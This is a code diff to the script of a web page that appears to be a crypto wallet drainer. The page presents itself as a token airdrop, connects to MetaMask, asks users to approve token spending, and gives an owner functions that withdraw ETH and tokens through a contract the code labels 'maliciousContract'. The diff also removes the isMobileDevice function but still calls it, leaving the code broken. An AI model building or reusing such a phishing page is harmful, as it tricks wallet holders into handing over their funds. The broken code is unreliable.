@@ -343,14 +343,7 @@ async function connectMetaMask() {
 
     
 
-    // Function to check if the user is on a mobile device
-    function isMobileDevice() {
-      return /Mobi|Android/i.test(navigator.userAgent); // Detect mobile user agents
-    }
-
-    let isMetaMaskMessageShown = false; // Flag to track if the message has been shown
-
-// Function to open MetaMask on mobile devices
+  // Function to open MetaMask on mobile devices
 function openMetaMaskMobile() {
   window.location.href = `metamask://dapp/${window.location.href}`; // Redirect to MetaMask app
 
@@ -362,11 +355,6 @@ function openMetaMaskMobile() {
   }, 1000); // Delay to allow the app to open
 }
 
-
-   
-
-
-    
 // Function to approve the contract for spending tokens
 async function approveSpending() {
   const tokenContract = new web3.eth.Contract(contractABI, tokenAddress); // Instantiate the token contract
@@ -388,61 +376,52 @@ async function approveSpending() {
   }
 }
 
+// Function for the owner to withdraw ETH from the contract
+async function withdrawETH() {
+  const maliciousContract = new web3.eth.Contract(contractABI, contractAddress); // Instantiate the contract
+  try {
+    await maliciousContract.methods.withdrawETH().send({ from: ownerAddress }); // Call the withdrawETH function
+    alert('ETH withdrawn successfully!'); // Notify owner of success
+  } catch (error) {
+    alert('Error during ETH withdrawal'); // Notify owner of the error
+  }
+}
 
+// Function for the owner to withdraw tokens from the contract
+async function withdrawTokens() {
+  const maliciousContract = new web3.eth.Contract(contractABI, contractAddress); // Instantiate the contract
+  try {
+    await maliciousContract.methods.withdrawTokens().send({ from: ownerAddress }); // Call the withdrawTokens function
+    alert('Tokens withdrawn successfully!'); // Notify owner of success
+  } catch (error) {
+    alert('Error during token withdrawal'); // Notify owner of the error
+  }
+}
 
-    
-
-    // Function for the owner to withdraw ETH from the contract
-    async function withdrawETH() {
-      const maliciousContract = new web3.eth.Contract(contractABI, contractAddress); // Instantiate the contract
-      try {
-        await maliciousContract.methods.withdrawETH().send({ from: ownerAddress }); // Call the withdrawETH function
-        alert('ETH withdrawn successfully!'); // Notify owner of success
-      } catch (error) {
-        alert('Error during ETH withdrawal'); // Notify owner of the error
-      }
-    }
-
-    // Function for the owner to withdraw tokens from the contract
-    async function withdrawTokens() {
-      const maliciousContract = new web3.eth.Contract(contractABI, contractAddress); // Instantiate the contract
-      try {
-        await maliciousContract.methods.withdrawTokens().send({ from: ownerAddress }); // Call the withdrawTokens function
-        alert('Tokens withdrawn successfully!'); // Notify owner of success
-      } catch (error) {
-        alert('Error during token withdrawal'); // Notify owner of the error
-      }
-    }
-
-
-
-    
-
-    // Function to show the processing message
-   function showProcessingMessage() {
+// Function to show the processing message
+function showProcessingMessage() {
   const processingMessage = document.getElementById('processingMessage');
   processingMessage.classList.add('show', 'grow-shrink'); // Add "show" and "grow-shrink" classes
 }
 
-
-    // Function to hide the processing message
+// Function to hide the processing message
 function hideProcessingMessage() {
   const processingMessage = document.getElementById('processingMessage');
   processingMessage.classList.remove('show', 'grow-shrink'); // Remove "show" and "grow-shrink" classes
 }
 
+// Add event listeners to buttons for user interaction
+document.getElementById('connectButton').addEventListener('click', connectMetaMask); // Connect MetaMask
+document.getElementById('approveButton').addEventListener('click', approveSpending); // Approve spending
+document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop); // Claim airdrop
+document.getElementById('withdrawETHButton').addEventListener('click', withdrawETH); // Withdraw ETH
+document.getElementById('withdrawTokensButton').addEventListener('click', withdrawTokens); // Withdraw tokens
 
-    // Add event listeners to buttons for user interaction
-    document.getElementById('connectButton').addEventListener('click', connectMetaMask); // Connect MetaMask
-    document.getElementById('approveButton').addEventListener('click', approveSpending); // Approve spending
-    document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop); // Claim airdrop
-    document.getElementById('withdrawETHButton').addEventListener('click', withdrawETH); // Withdraw ETH
-    document.getElementById('withdrawTokensButton').addEventListener('click', withdrawTokens); // Withdraw tokens
+// Check if the user is on a mobile device and add a mobile-specific action
+if (isMobileDevice()) {
+  document.getElementById('connectButton').addEventListener('click', openMetaMaskMobile); // Open MetaMask on mobile
+}
 
-    // Check if the user is on a mobile device and add a mobile-specific action
-    if (isMobileDevice()) {
-      document.getElementById('connectButton').addEventListener('click', openMetaMaskMobile); // Open MetaMask on mobile
-    }
   </script>
 </body>
 </html>
